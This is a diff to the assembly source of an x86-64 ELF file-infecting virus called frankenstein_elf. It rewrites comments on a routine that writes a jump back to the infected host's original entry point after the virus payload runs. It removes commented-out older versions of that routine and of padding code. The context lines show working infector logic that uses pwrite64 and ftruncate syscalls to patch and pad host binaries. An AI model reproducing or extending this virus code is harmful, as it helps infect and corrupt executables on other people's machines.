@@ -913,8 +913,12 @@ frankenstein_elf:
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
-;huge shoutout to MalcolmVX for helping me patch this routine and 
-;figure out the correct way to load the OEP into rax using a get_eip routine
+; .write_jmp_to_oep writes the instruction to return to the OEP
+; after execution of virus payload in an infected ELF
+; it uses the technique from s01den's paper in tmp.0ut vol.1 "Return To Original Entry Point Despite PIE" 
+; 
+; huge shoutout to MalcolmVX for the feedback and guidance to 
+; figure out the correct way to load the OEP into rax using a get_eip routine
 ;
 ;	rax = [rsp]
 ;	rax= [rsp - vlen - vxstart + OEP]
@@ -942,44 +946,6 @@ frankenstein_elf:
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 
-;original implementation of write_jmp_to_oep routine
-;	.write_jmp_to_oep:
-;		call .deltarip
-;		.deltarip:
-;			pop rax
-;			sub rax, .deltarip
-;		xor r11, r11
-;		;mov r11, qword [r14 + 448]
-;		lea r11, [rax + _start]
-;		mov rdx, 12
-;		mov byte [r14 + 150], 0x48			;0x488d05 = lea rax
-;		;mov byte [r14 + 151], 0x8d			
-;		mov byte [r14 + 151], 0xb8			
-;		;mov byte [r14 + 151], 0x8b			
-;		;mov byte [r14 + 152], 0x84			
-;		;mov byte [r14 + 153], 0x24			
-;		;mov byte [r14 + 154], 0xC0			
-;		;mov byte [r14 + 155], 0x01			
-;		;mov byte [r14 + 156], 0x00			
-;		;mov byte [r14 + 152], 0x05			
-;		;mov byte [r14 + 152], 0x05			
-;		;mov byte [r14 + 153], 0x60			
-;		mov qword [r14 + 152], r11			;address of original host entry point
-;		;mov byte [r14 + 157], 0x00			;0xff 0xe0 = jump eax
-;		mov byte [r14 + 160], 0xff			;0xff 0xe0 = jump eax
-;		mov byte [r14 + 161], 0xe0			;0xff 0xe0 = jump eax
-;		;mov byte [r14 + 156], 0xff			;0xff 0xe0 = jump eax
-;		;mov byte [r14 + 157], 0xe0			;0xff 0xe0 = jump eax
-;		;mov byte [r14 + 150], 0x68			;0x68 = push
-;		;mov dword [r14 + 151], r11d			;address of original host entry point
-;		;mov byte [r14 + 155], 0xc3			;0xc3 = ret
-;		lea rsi, [r14+ 150]
-;		mov r10d, dword [r14 + 436]
-;		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
-;		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
-;		syscall
-		
-	
 	;ftruncate syscall will grow the size of file (corresponding to file descriptor r14 + 416)
 	; by n bytes, where n is a signed integer, passed in rsi
 	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
@@ -993,16 +959,6 @@ frankenstein_elf:
 		mov r11d, dword [PAGESIZE]
 		;;;add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
 		add r10d, 6							;add 6 bytes for push/ret original entrypoint
-		;;previous version with shifts
-		;mov dword [vxdatasegment], r10d
-		;;shr r10d, 12						;divide file offset size by PAGESIZE
-		;mov dword [num_pages], r10d		;to calculate the number of pages to pad the file		
-		;;xor rax, rax
-		;;mov eax, dword [PAGESIZE]
-		;;imul r10d
-		;shl r11d, 1
-		;;add eax, dword [PAGESIZE] 
-		;;add eax, r11d 
 		mov rsi, qword [r14 + 424]		;offset of next segment after .text in host ELF
 		add esi, r11d 
 		mov dword [r14 + 444], esi		;vx_padding_size (# padding bytes after vx)
